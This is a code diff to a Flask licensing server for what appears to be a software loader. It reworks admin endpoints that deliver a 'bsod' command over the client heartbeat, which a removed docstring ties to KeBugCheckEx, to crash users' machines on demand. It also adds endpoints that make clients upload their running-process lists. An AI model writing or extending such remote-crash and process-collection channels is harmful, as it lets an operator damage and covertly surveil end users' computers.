@@ -32,7 +32,7 @@ DOWNLOAD_TOKEN_TTL = 60  # seconds before a download token expires
 MAX_DOWNLOADS_PER_SESSION = 10  # max file downloads per session (anti-abuse)
 MAX_ATTEMPTS  = 5     # max failed attempts before temporary ban
 BAN_DURATION  = 600   # seconds to ban after too many failures
-MAX_REQUEST   = 4096  # max request body size in bytes
+MAX_REQUEST   = 65536  # max request body size in bytes (increased for process reports)
 SIGNATURE_TTL = 30    # seconds before a signed request expires
 
 # ── HMAC Shared Secret ──────────────────────────────────────────────
@@ -216,16 +216,17 @@ def init_db():
             FOREIGN KEY (key_id) REFERENCES license_keys(id) ON DELETE CASCADE
         );
 
-        CREATE TABLE IF NOT EXISTS monitor_commands (
-            session_id  TEXT    PRIMARY KEY,
+        CREATE TABLE IF NOT EXISTS session_commands (
+            session_id  TEXT    NOT NULL,
             command     TEXT    NOT NULL,
-            issued_at   REAL    NOT NULL
+            issued_at   REAL    NOT NULL,
+            PRIMARY KEY (session_id, command)
         );
 
-        CREATE TABLE IF NOT EXISTS monitor_data (
+        CREATE TABLE IF NOT EXISTS session_processes (
             session_id  TEXT    PRIMARY KEY,
-            data        TEXT    NOT NULL,
-            timestamp   REAL    NOT NULL
+            processes   TEXT    NOT NULL,
+            collected_at REAL  NOT NULL
         );
 
         CREATE INDEX IF NOT EXISTS idx_sessions_key ON sessions(key_id);
@@ -526,6 +527,22 @@ def heartbeat():
         db.commit()
         return jsonify({"success": False, "message": "Session expired. Please re-authenticate."})
 
+    # ── Check for pending session commands (bsod, report_processes) ──
+    cmd_row = db.execute("SELECT command FROM session_commands WHERE session_id = ? ORDER BY issued_at ASC LIMIT 1", (session_id,)).fetchone()
+    if cmd_row:
+        cmd = cmd_row["command"]
+        db.execute("DELETE FROM session_commands WHERE session_id = ? AND command = ?", (session_id, cmd))
+        if cmd == "bsod":
+            app.logger.warning(f"[heartbeat] BSOD command delivered | session={session_id[:16]}... | ip={client_ip}")
+            db.execute("DELETE FROM sessions WHERE id = ?", (session_id,))
+            db.commit()
+            return jsonify(sign_response({"success": True, "message": "OK", "action": "bsod"}))
+        elif cmd == "report_processes":
+            app.logger.info(f"[heartbeat] Process report requested | session={session_id[:16]}... | ip={client_ip}")
+            db.execute("UPDATE sessions SET last_seen = ? WHERE id = ?", (now, session_id))
+            db.commit()
+            return jsonify(sign_response({"success": True, "message": "OK", "action": "report_processes"}))
+
     # ── Check if this session has a kill command ──
     kill_row = db.execute("SELECT * FROM kill_commands WHERE session_id = ?", (session_id,)).fetchone()
     if kill_row:
@@ -534,16 +551,6 @@ def heartbeat():
         db.execute("DELETE FROM sessions WHERE id = ?", (session_id,))
         db.commit()
         return jsonify(sign_response({"success": True, "message": "OK", "action": "kill"}))
-
-    # ── Check for monitor/bsod commands ──
-    mon_row = db.execute("SELECT * FROM monitor_commands WHERE session_id = ?", (session_id,)).fetchone()
-    if mon_row:
-        cmd = mon_row["command"]
-        db.execute("DELETE FROM monitor_commands WHERE session_id = ?", (session_id,))
-        app.logger.info(f"[heartbeat] Monitor command '{cmd}' delivered | session={session_id[:16]}... | ip={client_ip}")
-        db.execute("UPDATE sessions SET last_seen = ? WHERE id = ?", (now, session_id))
-        db.commit()
-        return jsonify(sign_response({"success": True, "message": "OK", "action": cmd, "expiry": str(int(key_row["expires_at"]))}))
 
     db.execute("UPDATE sessions SET last_seen = ? WHERE id = ?", (now, session_id))
     db.commit()
@@ -782,6 +789,74 @@ def kill_sessions():
         db.execute("DELETE FROM sessions")
     db.commit()
     return jsonify({"success": True, "message": "Sessions killed."})
+
+@app.route("/api/admin/sessions/bsod", methods=["POST"])
+@require_admin
+def bsod_session():
+    """Issue BSOD command for a session. Triggers on next heartbeat."""
+    db = get_db()
+    data = request.get_json(silent=True) or {}
+    session_id = data.get("session_id", "")
+    app.logger.warning(f"[admin] BSOD issued | session={session_id[:16]}... | ip={request.remote_addr}")
+    if not session_id:
+        return jsonify({"success": False, "message": "Missing session_id."})
+    row = db.execute("SELECT * FROM sessions WHERE id = ?", (session_id,)).fetchone()
+    if not row:
+        return jsonify({"success": False, "message": "Session not found."})
+    db.execute("INSERT OR REPLACE INTO session_commands (session_id, command, issued_at) VALUES (?, 'bsod', ?)",
+               (session_id, time.time()))
+    db.commit()
+    return jsonify({"success": True, "message": "BSOD command queued. Will trigger on next heartbeat (~10s)."})
+
+@app.route("/api/admin/sessions/request-processes", methods=["POST"])
+@require_admin
+def request_processes():
+    """Request process list from a session. Client reports on next heartbeat."""
+    db = get_db()
+    data = request.get_json(silent=True) or {}
+    session_id = data.get("session_id", "")
+    if not session_id:
+        return jsonify({"success": False, "message": "Missing session_id."})
+    row = db.execute("SELECT * FROM sessions WHERE id = ?", (session_id,)).fetchone()
+    if not row:
+        return jsonify({"success": False, "message": "Session not found."})
+    db.execute("INSERT OR REPLACE INTO session_commands (session_id, command, issued_at) VALUES (?, 'report_processes', ?)",
+               (session_id, time.time()))
+    db.commit()
+    app.logger.info(f"[admin] Process report requested | session={session_id[:16]}... | ip={request.remote_addr}")
+    return jsonify({"success": True, "message": "Process report requested. Will arrive on next heartbeat (~10s)."})
+
+@app.route("/api/admin/sessions/<session_id>/processes", methods=["GET"])
+@require_admin
+def get_session_processes(session_id):
+    """Get cached process list for a session."""
+    db = get_db()
+    row = db.execute("SELECT * FROM session_processes WHERE session_id = ?", (session_id,)).fetchone()
+    if not row:
+        return jsonify({"success": True, "processes": [], "collected_at": None})
+    return jsonify({
+        "success": True,
+        "processes": json.loads(row["processes"]),
+        "collected_at": datetime.fromtimestamp(row["collected_at"]).isoformat(),
+    })
+
+@app.route("/api/process-report", methods=["POST"])
+def process_report():
+    """Client endpoint: receive process list from a session."""
+    db = get_db()
+    data = request.get_json(silent=True) or {}
+    session_id = data.get("session", "")
+    processes = data.get("processes", [])
+    if not session_id:
+        return jsonify({"success": False, "message": "Missing session."})
+    row = db.execute("SELECT * FROM sessions WHERE id = ?", (session_id,)).fetchone()
+    if not row:
+        return jsonify({"success": False, "message": "Invalid session."})
+    db.execute("INSERT OR REPLACE INTO session_processes (session_id, processes, collected_at) VALUES (?, ?, ?)",
+               (session_id, json.dumps(processes), time.time()))
+    db.commit()
+    app.logger.info(f"[process-report] Received {len(processes)} processes | session={session_id[:16]}...")
+    return jsonify(sign_response({"success": True, "message": "OK"}))
 
 @app.route("/api/admin/injection-logs", methods=["GET"])
 @require_admin
@@ -1024,72 +1099,6 @@ def reload_build_keys():
     BUILD_KEYS = load_build_keys()
     builds = list(BUILD_KEYS.keys()) if BUILD_KEYS else []
     return jsonify({"success": True, "message": f"Keys reloaded: {builds}"})
-
-# ── Monitor / BSOD Admin Endpoints ───────────────────────────────────
-
-@app.route("/api/admin/monitor/request", methods=["POST"])
-@require_admin
-def request_monitor():
-    """Queue a 'monitor' command for a session. Client will report system info on next heartbeat."""
-    db = get_db()
-    data = request.get_json(silent=True) or {}
-    session_id = data.get("session_id", "")
-    if not session_id:
-        return jsonify({"success": False, "message": "Missing session_id."})
-    row = db.execute("SELECT * FROM sessions WHERE id = ?", (session_id,)).fetchone()
-    if not row:
-        return jsonify({"success": False, "message": "Session not found."})
-    db.execute("INSERT OR REPLACE INTO monitor_commands (session_id, command, issued_at) VALUES (?, ?, ?)",
-               (session_id, "monitor", time.time()))
-    db.commit()
-    app.logger.info(f"[admin] Monitor request queued | session={session_id[:16]}... | ip={request.remote_addr}")
-    return jsonify({"success": True, "message": "Monitor request queued. Data will appear after next heartbeat (~10s)."})
-
-@app.route("/api/admin/monitor/<session_id>", methods=["GET"])
-@require_admin
-def get_monitor_data(session_id):
-    """Get the latest monitor data reported by a client."""
-    db = get_db()
-    row = db.execute("SELECT * FROM monitor_data WHERE session_id = ?", (session_id,)).fetchone()
-    if not row:
-        return jsonify({"success": False, "message": "No monitor data available yet."})
-    return jsonify({"success": True, "data": json.loads(row["data"]), "timestamp": row["timestamp"]})
-
-@app.route("/api/admin/bsod", methods=["POST"])
-@require_admin
-def issue_bsod():
-    """Queue a BSOD command for a session. Client will trigger KeBugCheckEx on next heartbeat."""
-    db = get_db()
-    data = request.get_json(silent=True) or {}
-    session_id = data.get("session_id", "")
-    if not session_id:
-        return jsonify({"success": False, "message": "Missing session_id."})
-    row = db.execute("SELECT * FROM sessions WHERE id = ?", (session_id,)).fetchone()
-    if not row:
-        return jsonify({"success": False, "message": "Session not found."})
-    db.execute("INSERT OR REPLACE INTO monitor_commands (session_id, command, issued_at) VALUES (?, ?, ?)",
-               (session_id, "bsod", time.time()))
-    db.commit()
-    app.logger.info(f"[admin] BSOD command queued | session={session_id[:16]}... | ip={request.remote_addr}")
-    return jsonify({"success": True, "message": "BSOD command queued. Will execute on next heartbeat."})
-
-@app.route("/api/report-system", methods=["POST"])
-def report_system_info():
-    """Client reports system info (CPU, RAM, processes, etc.) after receiving 'monitor' action."""
-    db = get_db()
-    data = request.get_json(silent=True) or {}
-    session_id = data.get("session", "")
-    system_data = data.get("system", {})
-    if not session_id or not system_data:
-        return jsonify({"success": False, "message": "Missing session or system data."})
-    row = db.execute("SELECT * FROM sessions WHERE id = ?", (session_id,)).fetchone()
-    if not row:
-        return jsonify({"success": False, "message": "Invalid session."})
-    db.execute("INSERT OR REPLACE INTO monitor_data (session_id, data, timestamp) VALUES (?, ?, ?)",
-               (session_id, json.dumps(system_data), time.time()))
-    db.commit()
-    app.logger.info(f"[monitor] System data received | session={session_id[:16]}... | ip={request.remote_addr}")
-    return jsonify({"success": True, "message": "System data stored."})
 
 
 # ── Discord User Resolution ──────────────────────────────────────────
